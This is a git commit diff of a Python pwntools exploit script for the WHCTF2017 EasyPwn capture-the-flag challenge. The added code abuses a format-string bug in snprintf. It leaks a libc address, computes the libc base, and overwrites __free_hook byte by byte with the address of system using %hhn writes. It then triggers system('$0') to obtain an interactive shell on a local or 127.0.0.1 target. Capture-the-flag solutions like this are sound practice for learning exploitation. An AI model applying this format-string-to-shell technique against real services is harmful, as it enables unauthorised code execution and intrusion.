cc1fafd1aba7c3e455493b6dfcb1179fa1f1a571
M4xW4n9 <aboultraman@gmail.com>
2018-03-13 22:32:28 +0800

    snprintf fmt bug

--- whctf2017_EasyPwn/exp.py
+++ whctf2017_EasyPwn/exp.py
@@ -5,20 +5,18 @@ __Auther__ = 'M4x'
 from pwn import *
 from time import sleep
 import sys
-context.arch = "amd64"
 context.log_level = "debug"
 context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
 if sys.argv[1] == "l":
-    io = process("")
-    elf = ELF("")
-    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
-    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    io = process("./pwn1", env = {"LD_PRELOAD": "./libc.so.6"})
+    elf = ELF("./pwn1")
+    libc = ELF("./libc.so.6")
 
 else:
-    io = remote("", )
-    elf = ELF("")
-    libc = ELF("")
+    io = remote("127.0.0.1", 9999)
+    elf = ELF("./pwn1")
+    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
 def DEBUG():
 	raw_input("DEBUG: ")
@@ -27,12 +25,34 @@ def DEBUG():
 
 def fsb(payload):
     io.sendlineafter("Code:\n", "1")
-    io.sendlineafter("WHCTF2017:\n", payload)
+    #  DEBUG()
+    io.sendafter("2017:\n", payload)
+
+def getBase():
+    fsb(cyclic(1000) + "||%397$p")
+    io.recvuntil("0x")
+    libcBase = int(io.recvuntil("\n", drop = True), 16) - 240 - libc.symbols["__libc_start_main"]
+    success("libcBase -> {:x}".format(libcBase))
+    return libcBase
+
+def overwrite(libcBase):
+    freeHook = libcBase + libc.symbols["__free_hook"]
+    systemAddr = p64(libcBase + libc.symbols["system"])
+    oneGadget = 0x45216 + libcBase
+    oneGadget = p64(oneGadget)
+
+    for i in xrange(8):
+        payload = cyclic(1000) + "||%" + str(0x100 - 0xfe + ord(systemAddr[i])) + "c%133$hhn"
+        payload = payload.ljust(1016, 'a')
+        payload += p64(freeHook + i)
+        fsb(payload)
 
 if __name__ == "__main__":
-    fsb(cyclic(1000) + "%s|%5$p|%397$p|")
-    io.recvuntil("|0x")
-    stackAddr = int(io.recvuntil("|", drop = True), 16)
-    success("stackAddr -> {:x}".format(stackAddr))
+    libcBase = getBase()
+    overwrite(libcBase)
 
+    io.sendlineafter("Code:\n", "2")
+    io.sendlineafter("Name:\n", "$0")
 
+    io.interactive()
+    io.close()
